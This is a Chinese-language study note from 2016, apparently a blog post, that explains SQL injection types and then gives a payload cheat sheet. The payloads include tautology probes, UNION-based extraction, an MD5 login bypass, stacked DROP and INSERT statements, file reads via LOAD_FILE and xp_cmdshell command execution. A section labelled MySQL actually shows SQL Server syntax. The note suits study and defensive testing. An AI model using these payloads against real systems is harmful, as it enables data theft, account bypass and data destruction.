---
title: "SqlInject"
date: 2016-04-21 11:12
---

## 理解 SQL 注入

SQL数据库将单引号字符(')解析成代码与数据间的分界线：单引号外面的内容均是需要运行的代码，而用单引号引起的内容均是数据。

### 构造动态字符串

* 转义字符处理不当

* 类型处理不当

* 查询语句组装不当

* 错误处理不当

* 多个提交处理不当

### 不安全的数据库配置


---

* M: MySQL
* S: SQL Server
* P: PostgreSQL
* O: Oracle

## SQL 注入分类

### 按照注入点类型来分类

* 数字型注入点

在 Web 端大概是 http://xxx.com/news.php?id=1 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。这一类的 SQL 语句原型大概为 `select * from 表名 where id=1`。

* 字符型注入点

在 Web 端大概是 http://xxx.com/news.php?name=admin 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 `select * from 表名 where name='admin'`。注意多了引号。

* 搜索型注入点

这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。 此类注入点提交的 SQL 语句，其原形大致为：`select * from 表名 where 字段 like '%关键字%'`

### 按照执行效果来分类

这个分类也是 SQL 注入神器 sqlmap 所支持的注入模式

* 基于报错注入

这一类的也叫有回显注入，页面会返回错误信息，或者是把注入语句的结果直接返回在页面中。

* 基于布尔的盲注

根据返回页面的结果判断构造的SQL条件语句的真假性

* 基于时间的盲注

当根据页面返回的内容不能判断出任何信息时，使用条件语句查看时间延迟语句是否执行，也就是看页面返回时间是否增长来判断是否执行。


### 特殊形式注入

* 宽字符注入
* HTTP 头注入
* referer 注入
* host 注入
* cookies 注入
* 伪静态注入
* Base64 变形注入
* 系统命令注入
* XML 外部实体注入攻击（XXE 攻击）

## 确认sql注入

** 根据需要添加 "(", ")" **

* 字符串内联注入
    + '
    + 1' or '1'='1 {and}
    + 1' or '1'='2

* 数字值内联注入
    + '
    + 2+1 {-}
    + 1+0
    + 1 or 1=1 {and}
    + 1 or 1=2

* 数据库注释
    + \-\- (MSOP)
    + /\* \*/ (MSOP)
    + /\*!code \*/ {M}

    > SELECT /\*!32302 1/0 \*/ 1 FROM tablename => division by o error, if version > 3.23.02

    + \# {M}

* 数据库连接运算符
    + MySQL:
        + 'ab'='a' 'b'
        + CONCAT(str1, str2, str3)

        > SELECT CONCAT(login, password) FROM members

    + SQL Server:
        + 'ab'='a'+'b'
    + Oracle, PostgreSQL:
        + 'ab'='a'||'b'

* 堆叠查询
    + ; {S}

    > SELECT * FROM members; DROP member\-\-

* if语句
    + IF(condition, true-part, false-part) {M}

    > SELECT IF(1=1,'true','false')

    + IF condition true-part ELSE false-part {S}

    > IF (1=1) SELECT 'true' ELSE SELECT 'false'

    + attack sample

    > if ((select user)='sa' OR (select user)='dbo') select 1 else select 1/0 {S}

* 整数的使用
    + 0xHEXNUMBER {SM}
        + SELECT CHAR(0x66) {S}
        + SELECT 0x5045 {M} \-\-这不是整数而是16进制串
        + SELECT 0x50+0x45 {M} \-\-现在是整数了

* 没有引号的字符串
    + CHAR {SM}
    + CONCAT {M}

    > SELECT CONCAT(CHAR(75),CHAR(76)) => 'KL'

    + 0x457578 {M} \-\-16进制字符串
    + attack sample

    > SELECT LOAD_FILE(0x633A5C626F6F742E696E69) {M} => 'c:\bot.ini'

* 字符串Modification
    + ASCII() {SMP}
    + CHAR() {SM}

### 2. UNION注入

* sample

    > ' union select 1, 'anotheruser', 'not matter', 1\-\-

* 语言处理
    + Hex() {M}

* 绕过MD5哈希检查 {MSP}

    username:admin

    password:1234

    > ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055

    81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)

* 基于错误-探测字段名

    + HAVING {S}
        + ' HAVINT 1=1 \-\-
        + ' GROUP BY table.columnfromerror1 HAVING 1=1 \-\-
        + ' GROUP BY table.columnfromerror1, table.columnfromerror2 HAVING 1=1 \-\-
        + ...
    + SELECT 中使用 ORDER BY 探测字段数 {MSO}
        + ORDER BY 1 \-\-
        + ...
        + ORDER BY N \-\-

### 3. 数据类型、UNION、之类的

* 提示：

    + 经常给UNION配上ALL使用，因为经常会有相同数值的字段，而缺省情况下UNION都会尝试返回唯一值(records with distinct)
    + 如果你每次查询只能有一条记录，而你不想让原本正常查询的记录占用这宝贵的记录位，可以使用-1或者根本不存在的值来搞定原查询（前提是注入点在WHERE里）。
    + 在UNION中使用NULL，对于大部分数据类型来说这样都比瞎猜字符串、日期、数字之类的来得强
    + 盲注的时候要小心判断错误是来自应用的还是来自数据库的。因为像ASP.NET就经常会在你使用NULL的时候抛出错误（一般用户名的框中不会出现NULL）

+ 获取字段类型
    + ' union select sum(columntofind) from users\-\- {S}

    > Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a **varchar** data type as an argument. 如果没有返回错误说明字段是数字类型

    + 可以使用CAST()和CONVERT()

    > SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL\-\-

    + 类型查询

    >11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 \–\-

    没报错 - 语法是正确的。 这是MS SQL Server的语法。 继续。

    > 11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 \–\-

    没报错 – 第一个字段是integer类型。

    > 11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 \-\-

    报错 – 第二个字段不是integer类型

    > 11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 \–\-

    没报错 – 第二个字段是string类型。

    > 11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 \–\-

    报错 – 第三个字段不是integer

    ……

    Microsoft OLE DB Provider for SQL Server error '80040e07' Explicit conversion from data type int to image is not allowed.

    在遇到union错误之前会先遇到convert()错误，所以先使用convert()再用union

* 简单的注入{MSO}

    + '; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*

* 有用的函数、信息收集、内置程序、大量注入笔记

    + @@version(MS)

    数据库的版本。这是个常量，你能把它当做字段来SELECT，而且不需要提供表名。同样的你也可以用在INSERT/UPDATE语句里面，甚至是函数里面。

    + INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)

### 4. MySQL笔记

* sample

    + SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/

    + DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0

    HOST_NAME() IS_MEMBER (Transact-SQL)
    IS_SRVROLEMEMBER (Transact-SQL)
    OPENDATASOURCE (Transact-SQL)

    + INSERT tbl EXEC master..xp_cmdshell OSQL /Q"DBCC SHOWCONTIG"
